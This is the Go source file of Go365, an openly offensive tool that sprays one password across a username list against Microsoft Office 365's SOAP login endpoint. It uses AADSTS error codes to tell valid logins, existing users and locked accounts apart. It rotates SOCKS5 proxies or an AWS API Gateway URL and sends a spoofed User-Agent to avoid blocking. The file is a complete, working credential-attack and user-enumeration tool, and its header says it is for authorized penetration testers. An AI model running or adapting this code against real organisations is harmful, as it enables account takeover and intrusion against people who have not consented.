/*
Go365

authors: h0useh3ad, paveway3, S4R1N

license: MIT

Copyright 2020 Optiv Inc.
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
This tool is intended to be used by security professionals that are AUTHORIZED to test the domain targeted by this tool.

needs:
- Add a pre-test that enumerates the target domain and determines if it is a viable target for this particular endpoint.
- Error handling in a few areas.
	e.g... Setting up proxy (e.g. verify proxy server is up, handle timeouts, etc.)
- Debug mode output?
- Output file option should check if a file already exists.
- When parsing flagUsernameFile, include code that checks if the file exists (and exits if it doesn't), and check the lines to see if they have an "@" symbol (if they do, exit).

wants:
- Create more functions. So far this tool handles most logic in the main and doTheStuff functions. Might be a more logical way to do this.
- ...
*/

package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/beevik/etree"
	"github.com/fatih/color"
	"golang.org/x/net/proxy"
)

var (
	targetURL = "https://login.microsoftonline.com/rst2.srf" // keep an eye on this url.
)

const (
	version = "0.1"
	tool    = "Go365"
	authors = "h0useh3ad, paveway3, S4R1N"
	usage   = ` Usage:
     ./Go365 -ul <userlist> -p <password> -d <domain> [OPTIONS]
 Options:
     -h,            Show this stuff

   Required:
     -ul <file>             Username list to use
                              - file should contain one username per line WITHOUT "@domain.com"
                              (-ul ./usernamelist.txt)
     -p <string>            Password to attempt
                              - enclose in single quotes if it contains special characters
                              (-p password123  OR  -p 'p@s$w0|2d')
     -d <string>            Domain to test
                              (-d testdomain.com)
    
   Optional:
     -w <int>              Time to wait between attepmts in seconds. 
                              - Default: 1 second. 5 seconds recommended.
                              (-w 10)
     -o <string>           Output file to write to
                              - Will append if file exists
                              (-o ./output.out)
     -proxy <string>       Single proxy server to use
                              - IP address and Port separated by a ":"
                              - Has only been tested using SSH SOCKS5 proxies
                              (-proxy 127.0.0.1:1080)
     -proxyfile <string>    A file with a list of proxy servers to use
                              - IP address and Port separated by a ":" on each line
                              - Randomly selects a proxy server to use before each request
                              - Has only been tested using SSH SOCKS5 proxies
                              (-proxyfile ./proxyfile.txt)
     -url <string>          Endpoint to send requests to
                              - Amazon API Gateway 'Invoke URL'

 Examples:
   ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com
   ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5
   ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt
   ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxy 127.0.0.1:1080
   ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxyfile ./proxyfile.txt
   ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://k62g98dne3.execute-api.us-east-2.amazonaws.com/login
`
	banner = `
  ██████         ██████   ██████  ██████
 ██                   ██ ██       ██     
 ██  ███   ████   █████  ███████  ██████
 ██    ██ ██  ██      ██ ██    ██      ██
  ██████   ████  ██████   ██████  ██████
`
)

func wait(wt int) {
	waitTime := time.Duration(wt) * time.Second
	time.Sleep(waitTime)
}

func writeOutput(writeFilePath string, writeString string) {
	f, err := os.OpenFile(writeFilePath, os.O_APPEND|os.O_WRONLY, 0644)
	l, err := f.WriteString(writeString + "\n")
	if err != nil {
		fmt.Println(err)
		f.Close()
		return
	}
	_ = l
}

func randomProxy(proxies []string) string {
	var proxy string
	if len(proxies) > 0 {
		proxy = proxies[rand.Intn(len(proxies))]
	}
	return proxy
}

func doTheStuff(un string, pw string, prox string) string {
	var returnString string

	requestBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
	<S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust">
	    <S:Header>
	    <wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
	    <wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To>
	    <ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo">
	        <ps:BinaryVersion>5</ps:BinaryVersion>
	        <ps:HostingApp>Managed IDCRL</ps:HostingApp>
	    </ps:AuthInfo>
	    <wsse:Security>
	    <wsse:UsernameToken wsu:Id="user">
	        <wsse:Username>` + un + `</wsse:Username>
	        <wsse:Password>` + pw + `</wsse:Password>
	    </wsse:UsernameToken>
	</wsse:Security>
	    </S:Header>
	    <S:Body>
	    <wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0">
	        <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
	        <wsp:AppliesTo>
	        <wsa:EndpointReference>
	            <wsa:Address>online.lync.com</wsa:Address>
	        </wsa:EndpointReference>
	        </wsp:AppliesTo>
	        <wsp:PolicyReference URI="MBI"></wsp:PolicyReference>
	    </wst:RequestSecurityToken>
	    </S:Body>
	</S:Envelope>`)

	client := &http.Client{}

	if prox != "" {
		dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
		if err != nil {
			fmt.Println("Error connecting to proxy.")
		}
		tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
		client = &http.Client{
			Transport: tr,
			Timeout:   15 * time.Second,
		}
	}

	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
	request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
	if err != nil {
		panic(err)
	}

	response, err := client.Do(request)
	if err != nil {
		panic(err)
	}

	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		print(err)
	}

	xmlResponse := etree.NewDocument()
	xmlResponse.ReadFromBytes(body)

	x := xmlResponse.FindElement("//psf:text")
	if x == nil {
		returnString = color.GreenString("[+] Possible valid login! " + un + " : " + pw)
		return returnString
	}
	t := xmlResponse.FindElement("//psf:text")
	if strings.Contains(t.Text(), "AADSTS50059") {
		fmt.Println(color.RedString("[-] Domain not found in o365 directory. Exiting..."))
		os.Exit(0) // no need to continue if the domain isn't found
	} else {
		if strings.Contains(t.Text(), "AADSTS50034") {
			returnString = color.RedString("[-] User not found: " + un)
		} else {
			if strings.Contains(t.Text(), "AADSTS50126") {
				returnString = color.YellowString("[-] Valid user, but invalid password: " + un)
			} else {
				if strings.Contains(t.Text(), "AADSTS50056") {
					returnString = color.YellowString("[!] User exists, but unable to determine if the password is correct: " + un)
				} else {
					if strings.Contains(t.Text(), "AADSTS50053") {
						returnString = color.MagentaString("[-] Account locked out: " + un)
					} //need: add an else here as a catch-all that says "unknown error code" or something
				}
			}
		}
	}
	return returnString
}

type flagVars struct {
	flagHelp         bool
	flagUsernameFile string
	flagDomain       string
	flagPassword     string
	flagWaitTime     int
	flagProxy        string
	flagProxyFile    string
	flagOutFilePath  string
	flagTargetURL    string
}

func flagOptions() *flagVars {
	flagHelp := flag.Bool("h", false, "")
	flagUsernameFile := flag.String("ul", "", "")
	flagDomain := flag.String("d", "", "")
	flagPassword := flag.String("p", "", "")
	flagWaitTime := flag.Int("w", 1, "")
	flagProxy := flag.String("proxy", "", "")
	flagOutFilePath := flag.String("o", "", "")
	flagProxyFile := flag.String("proxyfile", "", "")
	flagTargetURL := flag.String("url", "", "")

	flag.Parse()

	return &flagVars{
		flagHelp:         *flagHelp,
		flagUsernameFile: *flagUsernameFile,
		flagDomain:       *flagDomain,
		flagPassword:     *flagPassword,
		flagWaitTime:     *flagWaitTime,
		flagProxy:        *flagProxy,
		flagProxyFile:    *flagProxyFile,
		flagOutFilePath:  *flagOutFilePath,
		flagTargetURL:    *flagTargetURL,
	}
}

func main() {

	fmt.Println(color.BlueString(banner))
	fmt.Println(color.RedString(" Version: ") + version)
	fmt.Println(color.RedString(" Authors: ") + authors + "\n")
	fmt.Println(" This tool is currently in development.\n")

	var usernameFile string
	var password string
	var domain string
	var outFilePath string
	var proxyListArray []string

	rand.Seed(time.Now().UnixNano())

	opt := flagOptions()

	//-h
	if opt.flagHelp {
		fmt.Printf("%s\n", usage)
		os.Exit(0)
	}

	// -ul
	if !(opt.flagUsernameFile == "") {
		usernameFile = opt.flagUsernameFile
	} else {
		fmt.Printf("%s\n", usage)
		fmt.Println(color.RedString("Must provide a user list. E.g. -ul ./userlist.txt"))
		os.Exit(0)
	}

	// -p
	if !(opt.flagPassword == "") {
		password = opt.flagPassword
	} else {
		fmt.Printf("%s\n", usage)
		fmt.Println(color.RedString("Must provide a password to test against the users. E.g. -p 'password123!'"))
		os.Exit(0)
	}

	// -d
	if !(opt.flagDomain == "") {
		domain = fmt.Sprintf("@" + opt.flagDomain)
	} else {
		fmt.Printf("%s\n", usage)
		fmt.Println(color.RedString("Must provide a domain. E.g. -d testdomain.com"))
		os.Exit(0)
	}

	// -proxy
	if opt.flagProxy != "" {
		proxyListArray = append(proxyListArray, opt.flagProxy)
		fmt.Println(color.GreenString("[!] Optional proxy settings configured: " + opt.flagProxy))

	} else if !(opt.flagProxyFile == "") {
		fmt.Println(color.GreenString("[!] Optional proxy file configured: " + opt.flagProxyFile))
		proxyList, err := os.Open(opt.flagProxyFile)
		if err != nil {
			log.Fatal(err)
		}
		defer proxyList.Close()
		proxies := bufio.NewScanner(proxyList)
		for proxies.Scan() {
			proxyListArray = append(proxyListArray, proxies.Text())
		}
	}

	// -o
	if !(opt.flagOutFilePath == "") {
		outFilePath = opt.flagOutFilePath
		fmt.Println(color.GreenString("[!] Optional output file configured: " + outFilePath))
		f, err := os.OpenFile(outFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			return
		}
		_ = f
	}

	// -url
	if !(opt.flagTargetURL == "") {
		targetURL = opt.flagTargetURL
	}

	// do the stuff
	usernameList, err := os.Open(usernameFile) //open and load the username file
	if err != nil {
		log.Fatal(err)
	}
	defer usernameList.Close() //close the username file
	usernames := bufio.NewScanner(usernameList)
	for usernames.Scan() { //iterate through the usernames
		user := usernames.Text() + domain
		result := doTheStuff(user, password, randomProxy(proxyListArray))
		if !(outFilePath == "") {
			writeOutput(outFilePath, result)
		}
		fmt.Println(result)
		wait(opt.flagWaitTime)
	}
	if err := usernames.Err(); err != nil {
		log.Fatal(err)
	}
	if !(outFilePath == "") {
		fmt.Println(color.GreenString("[!] Output file located at: " + outFilePath))
	}
	os.Exit(0)
}
